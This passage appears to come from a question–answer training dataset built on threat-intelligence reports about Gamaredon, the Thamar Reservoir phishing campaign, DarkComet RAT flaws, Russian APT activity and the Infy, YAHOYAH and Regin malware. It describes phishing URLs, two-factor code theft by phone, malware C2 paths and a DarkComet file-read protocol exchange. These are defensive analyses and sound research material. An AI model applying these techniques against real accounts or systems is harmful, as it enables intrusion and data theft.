between IPv4 addresses as well as the reuse of IPv4 addresses between domains names is apparent when viewing a large collection of entities involved in this campaign, as shown below.\nFocusing in on one of the newest samples (analyzed in Appendix A), the reuse of file names as well as SFX content files becomes apparent.\nAnswer this question: How does the Gamaredon Group's use of batch scripts indicate their evolution in toolset development, and what common characteristics can be observed across these scripts?",
    "output": "The Gamaredon Group's use of batch scripts indicates their evolution in toolset development through several common characteristics. Many of the batch scripts include misspellings of common English words, such as 'cmd' and 'domen' instead of 'command' and 'domain'. This suggests a level of obfuscation or lack of proficiency in English. Additionally, almost all batch scripts ping localhost as a means of sleeping, which is a simple way to introduce delays in script execution. Many scripts are named 'cmd' and include strings like 'Trons_ups' and 'Treams', indicating a consistent naming convention. Furthermore, the scripts often use the same commands for determining the operating system version, showing a standardized approach. The transition from using off-the-shelf tools like wget, UltraVNC, and ChkFlash to custom tools in the latest samples highlights the group's increasing sophistication and development of custom malware.",

    "instruction": "Medium Headline: Observation and Characterization of the Ecosystem of Malware\nOne of the aims of cyber security research is to observe and characterize the evolving nature and complex ecosystem of today's malware, botnets, cyber espionage and cyber crime networks. This is not a simple task, as the ecosystem of malware is very much like a complex adaptive system, only one that is dispersed across multiple ecosystems, operated by clandestine actors with potential criminal and/or espionage motivations who have shown a propensity to adapt their techniques to new software tools, social networking platforms and other technologies. Crimeware networks, which to some extent are the oldest and most widespread malware networks, target generalized population sets in a mostly undiscriminating fashion. Alongside crimeware networks, however, there are other networks that are more discriminating, often characterized by the use of custom-made software attacks, and which seek to exploit and infiltrate not random pools of victims but rather deliberately selected targets. Within each of these two major types of malware networks are likely many sub-types, including networks that specialize in distributed denial of service (DDoS) attacks. Confusing matters further is that toolkits and techniques used in one instance are borrowed from another, making classification difficult and increasingly questionable. Being able to map the ecosystem of malware, however, is critical for research, policy and operational matters, and so is one of the primary aims of our research in Shadows in the Cloud (Adair 2010).\nMedium Headline: From Criminal Exploitation to Political Espionage?\nCyber crime is as old as cyberspace itself, and criminal networks, as alluded to above, are longstanding characteristics of the dark side of the Internet. What is more novel is the use of criminal exploitation kits, techniques and networks for purposes of political espionage (Villeneuve 2010). Debates about whether or not governments are actively involved in cyber espionage and computer network exploitation, either through agencies they control directly or through some kind of privateering, now dominate the headlines and have become part of a growing politicization of the cyber security arena. One of the aims of our research is to discern to what extent we can impute motivations behind the attacks we document, to help understand whether in fact the networks under our observation are part of a criminal network, a political espionage network, an industrial espionage network, an opportunistic network, or some combination of these. Such questions, it should be pointed out, are entirely distinct (though not unrelated) to the question of attribution (i.e., who is responsible?).\nWe hypothesize that political espionage networks may be deliberately exploiting criminal kits, techniques and networks both to distance themselves from attribution and strategically cultivate a climate of uncertainty. To answer these questions requires a high degree of nuance, as the information we have been able to obtain is incomplete, and so a great deal of our analysis rests on inferences made on the basis of multiple data sources and our fusion methodology (See Box 2, page 3).\nMedium Headline: Collateral Compromise\nOrganizations from around the world have moved swiftly to adopt new information and communication technologies, and have become part of electronically linked communities in the commercial, government, and\nmilitary sectors. They exchange information as a matter of routine, across social networking and cloud computing platforms, using flash drives and other portable devices, and thus become co-dependent on each others' information and computer and network security practices. The vulnerabilities of one actor can quickly and unintentionally compromise unwitting third parties, which in turn can become the basis for actionable intelligence against those third parties. We hypothesize that there is a high probability for collateral compromise in any malware network because of this mutual dependence. A key consideration, of course, is how to discern intended from unintended victims, a problem that is difficult to solve.\nMedium Headline: Actionable Intelligence around Exfiltrated Data\nRelated to collateral compromise is the issue of the strategic value of exfiltrated data. Access to this data can offer important clues about the motivation and attribution of the attackers. It can also provide insight about the strategic value of the type of data that can be accessed through malware networks. In the course of our investigation, we assumed that we would get, at best, only a partial picture of the exfiltrated data, but even that partial picture would provide some potentially meaningful information for those who acquire it. While each individual data point may be of little value, when combined with other data acquired through other means (e.g., open source searching) a very detailed operational picture can be assembled. We try to assess and evaluate the exfiltrated data we were able to access with these issues in mind.\nMedium Headline: Attribution\nExamining attribution is an arduous but important component of any cyber security investigation and has become a major political issue at the highest levels around several recent cyber attacks. In order to characterise the attackers, a variety of technical indicators as well as behavioural indicators need to be analysed (Parker et al. 2004; Parker et al. 2003). These characteristics are interpreted in the context of the nature of the targets and the objective of the attack. The nature and timing of the attack, the exploit, the malware, and the command and control infrastructure, are just some of the components that go into determining attribution. Knowing the methods and behaviour of the attackers as well as the character of the tools the attackers use once inside the target's network, the data that the attackers exfiltrate and where that data goes, are also crucial parts of the overall assessment (Bejtlich 2010; Cloppert 2009; Mandiant 2010).\nMoreover, historical information and ongoing intelligence collection are crucial when trying to understand the scope of the threat (Deloitte & Touche LLP, 2010). It is difficult to assess attribution when examining an isolated attack; it is the broader patterns, connections and contextual information that inform the process. However, it is uncommon to have a complete data set covering all aspects of the attackers' operations. Some may have access to data regarding the attackers' activities once inside a particular network. Others may have extensive collections of malware samples and historical data on command and control infrastructure. Others may have information on how the attackers use various exploits, or craft targeted spear phishing emails and other methods focused on compromising particular targets. Others may have data retrieved from the attackers that indicate the identity of those who have been compromised. And finally still others may have the necessary geopolitical knowledge to interpret the attacks within a broader context.\nOften, investigations do not have the luxury of such a full data set and must rely on incomplete information and partial observations. Further complicating matters is that any of this information is often dependent on mistakes made by the attackers, which typically lead to slices of an overall network instead of a comprehensive view. Any questions concerning attribution must therefore always be set against a context of a complete consideration of alternative explanations and qualified observations.\nQuestion: What are the key factors to consider when examining attribution in a cyber security investigation, and why is a complete data set often unavailable?",
    "output": "Answer: Examining attribution involves analyzing various technical and behavioral indicators, such as the nature and timing of the attack, the exploit, the malware, and the command and control infrastructure. Historical information and ongoing intelligence collection are also crucial. However, it is uncommon to have a complete data set covering all aspects of the attackers' operations. Different entities may have access to different pieces of information, such as data on the attackers' activities inside a network, malware samples, or geopolitical context. Investigations often rely on incomplete information and partial observations, and any conclusions must be qualified by considering alternative explanations.",

    "instruction": "Big Headline: Modus operandi - investigation of targeted attacks\nThis chapter contains an in-depth analysis of a series of attacks against one of the Thamar Reservoir targets. The heavy attack began two days after the target, Dr. Thamar E. Gindin, was interviewed on the IDF radio station2.\nOver the course of two weeks, the threat actor used the following attacks against a single target:\n1. One spear phishing email containing malware.\n2. Three separate email messages with links to a fake log-in page, (including two factor authentication), one of them hosted on a breached website, the other two on dedicated domains.\n3. Two phone calls from the attacker, designed to build rapport for one of the phishing emails.\n4. Numerous attempts to take over cloud accounts using their Account Recovery mechanism.\n5. Numerous messages on Facebook and by e-mail.\nWhile we describe this case mostly from the point of view of a single target, we would like to emphasize that these scenarios repeated themselves for many other targets.\nMedium Headline: Part 1 -spear phish #1 - with malware\nIn May 2015 a legitimate email was sent asking several researchers to fill out a form that was sent as a Word document. The attackers obtained this correspondence, presumably by breaching the email account of the sender. They created a new Gmail account with a username similar to that of the original sender. Then, they sent the recipients a follow-up message (including the initial correspondence), asking them to fill up the attached form again. This time, the attachment was a weaponized Microsoft Excel file (The file is analyzed in the \"\" chapter of this report).\nIn other cases the attackers used the same methods - sending malware or phishing from a cloud email service (such as Gmail or Hotmail) using a username similar to that used by one of the target's acquaintances.\nThe malicious email was written in the original language of the correspondence - Hebrew. But it is clear that the attackers do not know Hebrew, as they made grammatical errors in the few words they have added to it (the rest were copied from the original email). Other messages, in English and Farsi, were analyzed by several specialists3and were determined to have been written by a native Iranian Persian speaker.\n2 The interview revolved around \"her own way to being a linguist and an Iranist, and promoting her books \"The Good, the Bad and the World - a Journey to Pre-Islamic Iran\" and \"The Book of Esther, Unmasked\" \".\n3Three of the targets are Iran and the Middle East researchers, and two of them are native Farsi speakers. Going through numerous messages they have received, and in one case a phone call - they have determined that the writer/speaker is native in Iranian Persian.\nBelow is an example of another case (the email includes the professional signature of the impersonated sender):\nMedium Headline: Part 2 - phone calls to victims\nA week later, the attackers called the target's office number. The office manager, who received the call, later said that someone with \"bad English\" had asked to schedule an interview. The attackers later called the target's personal cell phone, and left a similar message with a callback number in London.\nThe attackers called the targets in other cases as well. For example, after breaching the password of a victim back in November 2014, the attacker called, pretending to be the assistant of a professor abroad who wished to talk to the victim. After several \"unexplained\" cut-offs during the call, the attacker said they should switch to Google Hangout, asking for the \"conversation code\" the victim had just received to his cell phone. The code was actually the second factor authentication for the victim's Gmail account. As soon as he gave it away - the attackers took over his Gmail, Facebook and other accounts.\nMedium Headline: Part 3 - spear phishing #2\nThat evening, the target received an email written in Farsi, coming from a spoofed email address (the real address of BBC Farsi). The message was a follow up on the call that morning, asking to schedule the interview for the next day:\nThe headers of the message indicate that it was spoofed, and was actually sent from a server in Hungary, mail5.maxer.hu.\nThe email contained a linked text, Document.pdf, with this URL:\nhttps://www.google.com/url?q=http://login-users.com/Drive-\nAuto/AutoSecond?Chk=<redacted>&sa=D&sntz=1&usg=<redacted>\nThe URL is composed of two parts. The first part is a legitimate Google.com address, with the q= parameter. The second part is the value of that parameter - a fake Google Drive log-in page in the attackers controlled domain - login-users.com. Upon clicking the link, the target is redirected to the address in the q= parameter. This is a trick the attackers use to mislead the target - making her think she is about to visit a legitimate Google website.\nThe fake Google Drive log-in page was customized to the target; her real username was already filled in:\nThe Whois information for the domain is similar to those used in legitimate Google owned domain, except for the 'd' instead of 'b' in the \"registrant-email\" value: gmail-aduse@google.com:\nThe attacker sent three follow-up emails to make sure the target had received the first one, from the same server in Hungary and with the Reply-To address saeed.kn2003@gmail.com.\nMedium Headline: Part 4 - breaking into an Israeli research institute to set up phising page #3\nThe next morning, several targets received an email inviting them to participate in an \"Iran Israel Forum\" of an Israeli research institute. The email can be seen below (sensitive information has been redacted):\nThe headers of the email indicate that they the email was not spoofed, and had been sent from the research institute. As can be seen, the email contained various grammatical mistakes. Moreover, anyone who knows\nthe institute would notice that parts of the message are inaccurate (this will not be elaborated here in order not to expose the institute's identity).\nThe words \"Access To Forum\" linked to a page within the real, compromised, website of the institute. The page contained more information about the \"forum\", and offered four \"sign in\" options, as can be seen in the screenshot below:\nClicking one of the sign-in options led to a custom made log-in page, again, with the target's username, email, and picture already present:\nAfter submitting a password, the victim is taken to the next fake page in which she is asked to submit the two factor authentication code she has just received to her phone:\nUpon submission, the victim is redirected to a static \"registration confirmed\" page.\nInterestingly, the log file for the previous pages was hosted publicly on the same virtual folder. The log contained the false credentials the target submitted (as she recognized this was a fake)4:\nWe reported the breach to the institue, and they investigated and cleaned it off. They informed us that their own servers were never breached. Rather, a server run by a researcher who was givenn a \"virtual folder\" within their domain was. This, of course, did not change the end result - the attackers managed to implant a fake page within the Instititue domain, and were able to send an email using the same domain. This pattern is recurring: The attackrs go after \"low hanging fruits\" in order to reach their goal rather than using advnaced techincal means.\nMedium Headline: Part 5 - spear phishing #4\nFour days later, the target received the following email from the same fake address as in :\n4 The \"pass\" filed intermingled with the IP filed in the original log, file due to bidirectionality issues.\nThe email contained the real textual signature of the sender, and the word Toda (Thank you, in Hebrew), as the sender usually writes.\nThe hyperlink text in the message appeared to be leading to youtube.com, but in fact linked to a fake address that only looked like a YouTube domain.\nThe page contained a \"private Youtube video\", asking the viewer to sign in in order to watch it:\nAfter signing in, the page redirected to a specific interview in target's real YouTube channel - proving once again that the attacks are targeted and based on reconnaissance.\nMedium Headline: Part 6 - Abusing account recovery mechanisms\nDuring the writing of this article, the attackers continued to attempt to take over various accounts of the target. For example, they tried to fool Google into giving them access to the target's Gmail accounts using the Google Account Recovery process5 (a process which in certain cases enables one to regain access to an account even if the password and other means of authentication are unavailable).\nThe attackers tried similar methods against the target's account on Facebook and Yahoo, and had also set up a fake Hotmail account, which was used as the secondary email to which the recovered password should be sent.\nMedium Headline: Part 7 - Private messages\nThe target has been contacted by various \"weird\" characters on Facebook and by e-mail. They have been asking her various questions that have nothing to do with her professional expertise and tried to contact her in various ways. The conversation are conducted in Persian.\nWe cannot find a direct connection between these Facebook characters and the above mentioned attacks. However, in addition to them happening close to the attacks, we do know that at least one of the accounts is fake.\nOne of the fake characters who has engaged in conversation, is using throughout her profile pictures of a Russian model, and has presented herself as with different, contradicting, background stories in conversations with different targets.\n\nBased on the above text, answer a question. What strategies did the Thamar Reservoir attackers use to persistently attempt to take over a target's accounts, and how did they adapt their tactics based on the target's behavior?",
    "output": "The Thamar Reservoir attackers used various strategies to persistently attempt to take over a target's accounts, including sending multiple spear phishing emails, making phone calls, and abusing account recovery mechanisms. They adapted their tactics based on the target's behavior by sending follow-up emails to ensure the target received the initial phishing email and by customizing fake login pages with the target's information.

If often features a full UI designed for ease of use.\nIn contrast, the \"server\" program is a much smaller stub which is installed on the compromised computer. These servers feature no UI, and take measures to disguise their presence.\nOn execution, the sever initiates a connection back to the client computer, and remote control is then possible. The client program typically has the ability to generate server stubs, which have the IP address of the client (the command and control center) hard coded into them.\nSome free versions of the RATs we investigated were feature limited to producing server stubs that were not stealthy or could only connect to localhost, with the ability to generate \"full\" stubs only available on purchasing the paid version.

The encryption method used in DarkComet has already been extensively analyzed by various researchers [2] [3], so we will not reiterate here.\nWe reverse engineered the DarkComet protocol and analyzed it for vulnerabilities.\nAfter a quick look at its protocol, it is easy to see that it uses a \"|\" as it's delimiter between string parameters. Although, there is no delimiter between the command and the first parameter.\nThe DarkComet client stores information about servers in a SQLite database, which is kept in the directory from which the client runs. This database also holds usernames and passwords for FTP servers to which the client has been configured to connect. When a new connection is established, a handshake occurs which looks like this:\nFor testing purposes, we wrote our own \"server\" which replied with the following shorter SIN (Server Info) string:\nBig Headline: SQL Injection in DarkComet\nBy attaching a debugger to the client, we were able to view the SQL strings it generated by the client to query its database. Upon connection with the above SIN string, the following SQL statement is executed:\nIf that UUID is not in the database, the following statement is executed:\n\"INSERT INTO dc_users VALUES( \"{7}\", \"1\", \"S\", \"W\", \"0\")\" If that UUID already exists, then the following statement is executed:\nThere is no input validation or sanitization, so all of these SQL statements are injectable with the following caveats:\n\u2022 Executing multiple commands in one statement with \";\"s is disabled, anything after a \";\" will not be executed\n\u2022 load_extension() is disabled\nThese can be used to modify data in the database. We did not further develop these vulnerabilities to get information out of the database, as our next exploit made doing so unnecessary.\nBig Headline: Arbitrary File Read from the Client's File System in DarkComet\nDarkComet uses a protocol that we have termed \"QuickUp\" in order to do ad-hoc uploading of files. For instance, the client has a feature which allows you to edit the compromised computers \"hosts\" file. This is done by downloading the hosts file to the client computer, editing it, and then uploading it back to the server. The last part of that exchange uses the QuickUp protocol, and looks like this:\nDarkComet QuickUpload\nC->S:\nQUICKUPC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\SynHosts.txt|752|HOSTS\nA new connection between the client and server is now established to handle the file transfer. The old connection is not closed first, the existing socket just has connect() called on it again\nC->S:\nIDTYPE\nS->C:\nQUICKUP752|C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\SynHosts.txt|HOSTS\nC->S (U):\n\\x41\\x00\\x43\nC->S (U):\nLENGTH_OF_FILE_IN_BYTES\nS->C (U): A\nC->S (U):\nRAW_DATA_OF_SPECIFIED_FILE\nS->C (U):\nA\nNote that the protocol consists of two stages, the QUICKUP command issued from the client, which establishes a \"new\" connection, and the QUICKUP command issued from the server, which begins the file transfer. Most importantly, after the new connection has been opened, the server requests the file to be uploaded. Three major weaknesses are present in this implementation:\n\u2022 There is no check that the file in the client QUICKUP is the same as the file in the server QUICKUP\n\u2022 The client responds to a QUICKUP commands, even if there was no corresponding QUICKUP from the client\n\u2022 The client allows the server to specify the absolute path\nThis flaw allows the retrieval of any file on the filesystem that it has permissions to read. So for instance, to get a dump of the SQLite database, we can do the following:\n(1) Connect to the server and successfully complete the handshake\n(2) Open a new connection over our old one, the client will now reply:\nAny file in the DarkComet directory can be read this way. Alternatively, absolute paths can be specified, allowing read access to any file on the client's filesystem (that DarkComet has permissions to access).\nReading \"C:\\secret.txt\" from Client's File System\nReading \"C:\\secret.txt\" from Client's File SystemOverall, this presents an issue for anyone using DarkComet. If a server sample is discovered, it is trivial to retrieve the key from the binary that is used in the network communication. The key retrieval process can even be automated [4]. Recently, the developer of the RAT has quit any further development due to its misuse, therefore leaving this issue unpatched [12].\nFor a stub server (written in python) that can exploit both of these vulnerabilities, see Appendix A.\n\nBased on the above text, answer a question. Why does the DarkComet RAT use a 'reverse-connecting' architecture, and what are the implications for detecting and mitigating its usage?",
    "output": "The DarkComet RAT uses a 'reverse-connecting' architecture where the server program, installed on the compromised computer, initiates a connection back to the client (attacker's machine). This architecture makes detection difficult because the compromised system appears to be initiating legitimate outbound connections rather than receiving unsolicited incoming connections. Mitigation strategies must focus on monitoring outbound traffic and identifying unusual patterns or connections to known command and control centers.",

The actors have also demonstrated the ability to maintain persistent, undetected, long-term access in compromised environments\u2014including cloud environments\u2014by using legitimate credentials.\nIn some cases, Russian state-sponsored cyber operations against critical infrastructure organizations have specifically targeted operational technology (OT)/industrial control systems (ICS) networks with destructive malware. See the following advisories and alerts for information on historical Russian state-sponsored cyber-intrusion campaigns and customized malware that have targeted ICS:\n\u2022 ICS Advisory\n\u2022 ICS Alert\n\u2022 ICS Alert\n\u2022 Technical Alert\n\u2022 CISA MAR\n\u2022 CISA ICS Advisory\nRussian state-sponsored APT actors have used sophisticated cyber capabilities to target a variety of U.S. and international critical infrastructure organizations, including those in the Defense Industrial Base as well as the Healthcare and Public Health, Energy, Telecommunications, and Government Facilities Sectors. High-profile cyber activity publicly attributed to Russian state-sponsored APT actors by U.S. government reporting and legal actions includes:\n\u2022 Russian state-sponsored APT actors targeting state, local, tribal, and territorial (SLTT) governments and aviation networks, September 2020, through at least December 2020. Russian state-sponsored APT actors targeted dozens of SLTT government and aviation networks. The actors successfully compromised networks and exfiltrated data from multiple victims.\n\u2022 Russian state-sponsored APT actors' global Energy Sector intrusion campaign, 2011 to 2018. These Russian state-sponsored APT actors conducted a multi-stage intrusion campaign in which they gained remote access to U.S. and international Energy Sector networks, deployed ICS-focused malware, and collected and exfiltrated enterprise and ICS-related data.\n\u2022 Russian state-sponsored APT actors' campaign against Ukrainian critical infrastructure, 2015 and 2016. Russian state-sponsored APT actors conducted a cyberattack against Ukrainian energy distribution companies, leading to multiple companies experiencing unplanned power outages in December 2015. The actors deployed malware to steal user credentials and used its destructive malware component, KillDisk, to make infected computers inoperable. In 2016, these actors conducted a cyber-intrusion campaign against a Ukrainian electrical transmission company and deployed malware specifically designed to attack power grids.\nFor more information on recent and historical Russian state-sponsored malicious cyber activity, see the referenced products below or .\n\u2022 Joint FBI-DHS-CISA CSA\n\u2022 Joint NSA-FBI-CISA CSA\n\u2022 Joint FBI-CISA CSA\n\u2022 Joint CISA-FBI CSA\n\u2022 CISA's webpage\n\u2022 CISA Alert\n\u2022 CISA ICS: Alert\nTable 1 provides common, publicly known TTPs employed by Russian state-sponsored APT actors, which map to the MITRE ATT&CK for Enterprise framework, version 10.

Without a centralized log collection and monitoring capability, organizations have limited ability to investigate incidents or detect the threat actor behavior described in this advisory. Depending on the environment, examples include:\no Native tools such as M365's Sentinel.\no Third-party tools, such as Sparrow, Hawk, or CrowdStrike's Azure Reporting Tool (CRT), to review Microsoft cloud environments and to detect unusual activity, service principals, and application activity. Note: for guidance on using these and other detection tools, refer to CISA Alert .\n\u25cf Look for behavioral evidence or network and host-based artifacts from known Russian state-sponsored TTPs. See table 1 for commonly observed TTPs.\no To detect password spray activity, review authentication logs for system and application login failures of valid accounts. Look for multiple, failed authentication attempts across multiple accounts.\no To detect use of compromised credentials in combination with a VPS, follow the below steps:\n\uf0a7 Look for suspicious \"impossible logins,\" such as logins with changing username, user agent strings, and IP address combinations or logins where IP addresses do not align to the expected user's geographic location.\n\uf0a7 Look for one IP used for multiple accounts, excluding expected logins.\n\uf0a7 Look for \"impossible travel.\" Impossible travel occurs when a user logs in from multiple IP addresses that are a significant geographic distance apart (i.e., a person could not realistically travel between the geographic locations of the two IP addresses during the time period between the logins). Note: implementing this detection opportunity can result in false positives if legitimate users apply VPN solutions before connecting into networks.\n\uf0a7 Look for processes and program execution command-line arguments that may indicate credential dumping, especially attempts to access or copy the ntds.dit file from a domain controller.\n\uf0a7 Look for suspicious privileged account use after resetting passwords or applying user account mitigations.\n\uf0a7 Look for unusual activity in typically dormant accounts.\n\uf0a7 Look for unusual user agent strings, such as strings not typically associated with normal user activity, which may indicate bot activity.\n\u25cf For organizations with OT/ICS systems:\no Take note of unexpected equipment behavior; for example, unexpected reboots of digital controllers and other OT hardware and software.\no Record delays or disruptions in communication with field equipment or other OT devices. Determine if system parts or components are lagging or unresponsive.\nQ: How have Russian state-sponsored APT actors historically gained initial access to target networks?

They use a single EXE, rather than a loader EXE and payload DLL as seen in the original variant. The malware initially performs a check to see if the victim as already infected by checking for window names \"Borland hcrtf 6.x\" or \"Macromedia Swsoc 7.x\".\nWe have identified five hidden GUI control forms in Infy M, one of which is not used. The first form includes three possible parameters. Parameter \"/ins\" installs the Trojan. It first creates and starts the service and on Windows versions prior to Vista it requires the \"/s\" parameter. After installing itself, the malware deletes any previous Infy installations. The does this by terminating processes and deleting Infy files in %system32%, %appdata%, %appdata%\\hcrtf (for example, pre-6.1 files incsy32.exe, incs32.exe, ntvdn.exe, grep.exe, hcrtf.exe, grep.dll). It then renames the ini file from grepc.ini to hcrtfc.ini. It completes clean-up by deleting the \"inverse Ser32\", \"grep\", and \"hcrtf\" services. Finally, it downloads and executes the update file from the C2 at /infy/update.php.\nThe /c (copy) parameter sets up autostart for the malware by writing to registry key \"run\" (Windows Vista and above) or \"runservices\" (versions prior to Windows Vista). The /s (service) parameter creates and starts the service (Windows Vista and later). At this point, the malware waits, and handles any commands issued over HTTP from the C2 (for example, execute a remote shell upon receiving command \"ASSHELL\").\nThe second form monitors for new or modified document files using \"CreateIoCompletionPort\" and \"ReadDirectoryChangesW\". It targets document file types .doc, .xls , .jpg, .jpe, .txt, .htm, .pgp, .pdf, .zip, and .rar and ZIP compresses them (using the password \"Z8(2000_2001uI\") into a file located at \\Program Files\\Yahoo!\\Messenger\\Profiles\\yfsbg\\yfsbg\\3dksf.tmp.\nThe third form takes a screen captures and stores it the \"yfsbg\" folder as 4dksf.tmp. It the uploads the screenshot and document-capture files using POST (instead of using GET as seen in the regular variants) to <C2 server>/infy/fms.php.\nThe fourth form is not used. The fifth form is used for microphone capture.\nThe 7.x versions install themselves as swsoc.exe (7.4 also seen using infy74f1.exe) at <documents and settings>\\all users\\application data\\macromedia\\8080\\swsoc.exe. They also create a subfolder \"fsbg\", where they store the copies of documents opened by the user.

[3\u20135] These bugs have been two of the most exploited vulnerabilities since their discovery. [6\u20137]\nSpear-phishing email sample\nTo infiltrate target networks, the attackers relied on crafty social engineering tricks. They used contextually relevant subjects, content, and aptly named attachments such as \"Statement\" to convince chosen recipients to download and open the files supposedly sent for review.\nThe following filenames were also used:\n\u2022 3AD 28 March 2013, SI re ASG Plan Bombing in Zamboanga City.doc\n\u2022 Troops Disposition 26 FEB 13.doc\n\u2022 2nd qtr 2013 AR PF15.doc\n\u2022 Draft AS-PH MLSA - v3 DAGTS_CFO_ILOG_DSA Clean.doc\n\u2022 \u95dc\u65bc104\u5e74\u4e2d\u592e\u653f\u5e9c\u7e3d\u9810\u7b97.doc (translation: About 104 years total central government budget.doc)\n\u2022 \u5be6\u9a57\u5ba4\u96fb\u8a71\u8868.doc (translation: Laboratory telephone table.doc)\n\u2022 [REDACTED]\u81ea\u8350\u4fe1\u53ca\u4e2a\u4eba\u7b80\u5386.doc (translation: [REDACTED] cover letter and your resume.doc)\nOpening the attachment runs an embedded malicious executable file, normally a downloader that accesses a malicious site to download an image file. Some attachments open decoy documents to hide their malicious nature.\nSample decoy documents (left: for Filipino targets; right: for Taiwanese targets)\nVery Small Headline: Installation Routine\nWhen executed, TROJ_YAHOYAH checks if the infected system's Windows OS is 64-bit capable or not. If it is, the Trojan will decrypt a 64-bit copy of itself using a simple XOR cipher with a single-byte key at \"0x90.\"\nIf the infected system is not 64-bit capable, the Trojan will just drop a 32-bit executable copy of itself (%APP DATA%\\Microsoft\\ Credentials\\Credentials. exe, detected as TROJ_YAHOYAH), along with an encrypted configuration file (%APP DATA%\\ Microsoft\\Credentials\\ Credentials.dat). The configuration file was encrypted using the same simple algorithm featured in the previously cited Rapid7 report on KeyBoy. Unlike the KeyBoy Trojan though, which searches for the string, \"IJUDHSDJFKJDE,\" TROJ_YAHOYAH searches for \"MDDEFGEGETGIZ.\" These strings, found at the beginning of the decrypted code, represent the configuration file. Absence of the said file terminates the infection process.\nCode that decrypts the configuration file using \"0x95,0x99,0x9d,0xc3,0xc7, 0xcb,0xd7,0xe5,0xbd,0xa9, 0xb5,0xeb,0xf7,0xe3,0xe7, 0xed\" as key\nTROJ_YAHOYAH's decrypted configuration file\nTROJ_YAHOYAH's configuration file, when decrypted, contains the links to sites from which it can download the files it needs to continue its routines. After decryption, it executes a dropped copy using the -Embedding parameter then attempts to delete itself.\nThe downloader's name was inspired by its self-deletion routine after dropping its payload. YAHOYAH was derived from the Visayan term \"hayohay,\" which loosely translates to an easily discarded \"servant\" in English.

[9] We have seen the actors use other images found in the same folder such as \"Ascent.jpg,\" \"Friend.jpg,\" and \"Home.jpg.\"\nA more in-depth analysis of the downloaded file reveals that malicious code has been appended to it. This allows TROJ_YAHOYAH to check offset 0x0F bytes from the end of the file code to identify a marker where the malicious binary code will be added, thus increasing the file's size.\nOther images used in attacks\nTROJ_YAHOYAH looks for the string, \"EHAGBPSL,\" and decrypts the appended binary code. When decrypted, an .EXE file is executed in memory. It automatically runs if the user has administrator privileges. If the user has limited privileges though, it will first attempt to obtain administrator privileges by bypassing User Account Control (UAC) but only on Windows 7. It will then decrypt another XOR-encrypted file using the key \"0x90\" in memory then check if the \"StartWork\" function was exported then execute it.\nMalicious code appended to that of the .JPG file\nSmall Headline: Maintaining Persistence\nThe last file that TROJ_YAHOYAH executes in memory is the main installer. It contains two more files that install a .DLL file detected as TROJ_YAHAMAM. This file is registered as a service named \"INCS\" to maintain persistence. It also drops the following XOR-encrypted malware-laced image files:\n\u2022 % windows %\\System32\\mfc41.dll (detected as TROJ_YAHAMAM)\n\u2022 % windows %\\inf\\mfc41.inf (a configuration file)\n\u2022 % windows %\\Fonts\\mfc41.tff (a copy of the configuration file)\n\u2022 %windows%\\Web Wallpaper\\images.jpg (contains BKDR_YAHAMAM)\nA batch (.BAT) file is used to start the INCS service. TROJ_YAHAMAM uses a trick similar to that of TROJ_YAHOYAH in order to decrypt files. When decrypted, TROJ_YAHAMAM executes the backdoor payload.\nVery Small Headline: Backdoor Payload: BKDR_ YAHAMAM\nBKDR_YAHAMAM is usually encrypted then embedded in an image file. When decrypted, it is loaded and executed in memory by a .DLL file that is registered as a service (TROJ_YAHAMAM). It exfiltrates data from infected systems, downloads and uploads files, and has a remote shell. It also drops a rootkit component named \"usb.sys,\" detected as RTKT_HIDEPORT.ZTCA-XO. The rootkit creates the service, usb30, and hides evidence of port communication to evade detection and remain persistent.\nSmall Headline: Command-and-Control Communication\nWhen executed, BKDR_YAHAMAM checks if it runs under svchost.exe. It uses the configuration file, %windows %\\Fonts\\mfc41.tff, which contains the following information:\n\u2022 C&C1\n\u2022 C&C2\n\u2022 C&C3\n\u2022 ControlPort\n\u2022 DownloadURL1\n\u2022 DownloadURL2\n\u2022 DownloadURL3\n\u2022 LoginPass (for authentication purposes)\n\u2022 Port1\n\u2022 Port2\n\u2022 Port3\n\u2022 USB\n\u2022 UserMark\nBKDR_YAHAMAM encrypts C&C communication using multiplication with a 1-byte key.

    "instruction": "Context: Big Headline: 3. HidinG teCHnique\nWe could simply say that the 64-bit version of Regin's stage #1 hides in plain sight. In fact, in contrast with most malicious software, this component is not packed or protected in any way from code inspection and reverse engineering. Instead, its structure is designed to fool investigators and users of a victim machine into believing that the malware is simply another standard component of the operating system. Two particular aspects of the sample structure will be covered in detail in sections 3.1 and 3.2.\nMedium Headline: 3.1 Mimicking a valid Microsoft dynamic link library\nFrom the DLL's export table and version information, we can see that the original name of the module is wshnetc.dll. This name is strongly reminescent of the other winsock-related system libraries that can be found on a clean Windows computer, in the system folder. Moreover, a victim would not be surprised to see that the description of this particular module is Winsock 2 Helper DLL (TL/IPv4).\nIn general, the characteristics highlighted above in conjunction with the remainder of the file properties would make up for a very convincing decoy even for a technically astute victim. The file properties as they would be presented to the user are shown in Figure 1.\nLooking again at the export table, we notice that the sample exports 16 different functions, which are exactly the same that are exported by Windows' own wshtcpip.dll. The sample does not provide the implementation of these functions, but it simply forwards the exports to wshtcpip.dll in the remote case that someone would try using these functions. The list of symbols exported by the sample is reported in Listing 1.\nListing 1: Symbols exported by the sample\nContinues overleaf\nContinued\nwshnetc.dll : WSHGetSockaddrType wshnetc.dll : WSHGetSocketInformation\nwshnetc.dll : WSHGetWSAProtocolInfo\nwshnetc.dll : WSHGetWildcardSockaddr\nwshnetc.dll : WSHGetWinsockMapping wshnetc.dll : WSHIoctl\nwshnetc.dll : WSHJoinLeaf\nwshnetc.dll : WSHNotify wshnetc.dll : WSHOpenSocket wshnetc.dll : WSHOpenSocket2 wshnetc.dll : WSHSetSocketInformation\nwshnetc.dll : WSHStringToAddress\nIt is then clear that the authors of this malware have spent a considerable amount of time camouflaging their creation as a system file. If we consider that it is probable that the sample would be located inside the system folder on a compromised system, it is very easy to see how its techniques might be very effective. Moreover, effectively stealing the exported functionalities from a different system module might deceive even a victim with a strong technical background.\nMedium Headline: 3.2 the certificate\nThe authors of this sample have also digitally signed the malware, with the intent to give it additional credibility and to make it look as if it was a Microsoft file. Keeping in mind the what was said about sample's exports in section 3.1, it is even more likely that with the digital signature they were trying to camouflage the sample as a legitimate Microsoft Windows system file.\nThe Authenticode signature is, in itself, valid, but the certificate properties (shown in Figure 2), highlight the inability of the system to find and validate the issuer of this certificate. The certificate's validity period is from 15/7/2011 to 14/10/2012; the fact that the compilation timestamp from the file's PE header is inside this range makes us believe that the binary was indeed built on November 25th, 2011. Moreover, combining 